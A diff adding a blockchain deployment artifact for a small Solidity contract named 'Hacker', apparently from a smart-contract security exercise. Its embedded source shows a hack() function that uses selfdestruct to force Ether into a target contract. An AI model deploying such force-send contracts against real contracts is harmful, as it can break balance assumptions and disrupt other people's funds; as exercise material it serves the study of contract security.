@@ -1,0 +1,89 @@
+{
+  "address": "0x557831492e082cCFD52067E1d9608c90b273b2C2",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "target_",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "hack",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x66cb06d5b7ebfe61d9c70842a38cc2a2191c166367fc37a5653b7d81d62f4e90",
+  "receipt": {
+    "to": null,
+    "from": "0x66fA22aEfb2cF14c1fA45725c36C2542521C0d3E",
+    "contractAddress": "0x557831492e082cCFD52067E1d9608c90b273b2C2",
+    "transactionIndex": 88,
+    "gasUsed": "119328",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x3d8aa51b9f8bf3ab4807b3b9f83cfe7efb4c2b088a8f3ef412bda0563b00d1cb",
+    "transactionHash": "0x66cb06d5b7ebfe61d9c70842a38cc2a2191c166367fc37a5653b7d81d62f4e90",
+    "logs": [],
+    "blockNumber": 10328788,
+    "cumulativeGasUsed": "6559382",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x39517b08835f7fb7658dfdC39FF33a0Be3258a6F"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "d046896f2a9ecc1d93ed9746dedab1cc",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"hack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Hacker.sol\":\"Hacker\"},\"evmVersion\":\"berlin\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Hacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Hacker {\\n    address public target;\\n\\n    constructor(address target_) {\\n        target = target_;\\n    }\\n\\n    function hack() external payable {\\n        selfdestruct(payable(target));\\n    }\\n}\\n\",\"keccak256\":\"0x8bf6de871db393db41f2a2fc9c561b31f4704ed0c7af6f3ea87386b3606bbab2\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5060405161015038038061015083398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610082565b600060208284031215610065578081fd5b81516001600160a01b038116811461007b578182fd5b9392505050565b60c0806100906000396000f3fe60806040526004361060265760003560e01c80634de260a214602b578063d4b83992146033575b600080fd5b60316059565b005b348015603e57600080fd5b5060456067565b604051605091906076565b60405180910390f35b6000546001600160a01b0316ff5b6000546001600160a01b031681565b6001600160a01b039190911681526020019056fea2646970667358221220acbfb170ce655c07f5fa11488be5c21892af0db4b608f707c8965158874e726864736f6c63430008000033",
+  "deployedBytecode": "0x60806040526004361060265760003560e01c80634de260a214602b578063d4b83992146033575b600080fd5b60316059565b005b348015603e57600080fd5b5060456067565b604051605091906076565b60405180910390f35b6000546001600160a01b0316ff5b6000546001600160a01b031681565b6001600160a01b039190911681526020019056fea2646970667358221220acbfb170ce655c07f5fa11488be5c21892af0db4b608f707c8965158874e726864736f6c63430008000033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 3,
+        "contract": "contracts/Hacker.sol:Hacker",
+        "label": "target",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
